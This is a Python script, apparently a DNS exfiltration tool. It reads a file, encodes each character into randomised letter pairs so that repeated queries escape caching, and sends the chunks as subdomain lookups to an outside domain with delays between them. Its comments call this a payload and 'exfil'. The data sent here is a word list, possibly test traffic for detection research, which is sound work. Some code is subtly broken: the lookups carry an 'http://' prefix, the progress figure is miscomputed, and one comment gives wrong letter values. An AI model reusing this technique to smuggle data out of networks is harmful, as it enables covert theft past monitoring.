import time
import socket
import string
import random

with open('words_alpha.txt', 'r') as f:
    string_to_encode = f.readlines()

string_to_encode = ' '.join([string.strip() for string in string_to_encode])
"""This is a string that I want to encode, based on the ASCII table there are 95 typable characters, so I will use this to encode the payload. 4 letters will represent one character on the ASCII table. aeda.suspicious-domain.com will mean that the payload is 'aeda', which split into pairs will be 'ae','da'. 'ae' translated into numbers are '1' and '5', summed it's 6, likewise, 'da' means '41', summed it's 5, hence 'aeda' means 65, which is the character 97, 'a' on the ascii table. The reason why it's encoded this way is to ensure there are numerous unique combinations that can reveal the same character, hence leading to a small chance of dns queries being cached."""

def encode(char):
    def obfuscate(num):
        # Takes an input num 0-9, and creates 2 letter alphabet combinations that, when converted into numbers, summed and ones place is extracted, will reveal the first number.
        first_alpha = random.choice(string.ascii_lowercase)
        first_alpha_no = ord(first_alpha) - 96
        first_alpha_no_ones = first_alpha_no%10
        if num < first_alpha_no_ones:
            num += 10
        if first_alpha_no_ones == num:
            # first alphabet already have exactly the ones needed, add 10 or 20
            possible_second_alpha = ['j', 't']
        else:
            delta = num - first_alpha_no_ones
            possible_second_alpha = [chr(delta + add + 96) for add in [0, 10, 20] if delta+add <=26]
        second_alpha = random.choice(possible_second_alpha)
        return f'{first_alpha}{second_alpha}'


    # range from 0-94
    num = ord(char) - 32
    # dec representation is shifted back by 32 as there are 32 not printable characters, hence not relevant for exfil
    tens = int(num/10)  # 9
    ones = num%10       # 3
    return f'{obfuscate(tens)}{obfuscate(ones)}'

def decode(twod_list_alphabets):
    # converts 2 pairs of alphabets into a single character. Converts (('t', 'p'), ('i','z')) to a, because t is 20, z is 16, summed and remainder is 6, p is 9, z is 26, remainder is 5, so number is 65, which is a.
    tens = (ord(twod_list_alphabets[0]) + ord(twod_list_alphabets[1]) - 192)%10
    ones = (ord(twod_list_alphabets[2]) + ord(twod_list_alphabets[3]) - 192)%10
    char = chr(tens*10 + ones + 32)
    return char

def payload_dns(string, domain, payload_size=5, delay=20):
    split_string = [string[i:i+4] for i in range(0, len(string), 4)]
    for idx, substring in enumerate(split_string):
        encoded_substring = ''.join([encode(char) for char in substring])
        print(f'{idx/len(split_string)}% complete')
        print(f'{encoded_substring}.{domain}')
        try:
            socket.gethostbyname(f'http://{encoded_substring}.{domain}')
        except:
            pass
        time.sleep(delay)
        

payload_dns(string_to_encode, 'adv_encoded_long.com', delay=5)

## short unit test
#print(encode('a'))
#print(decode(encode('a')))
#print(encode('A'))
#print(decode(encode('A')))
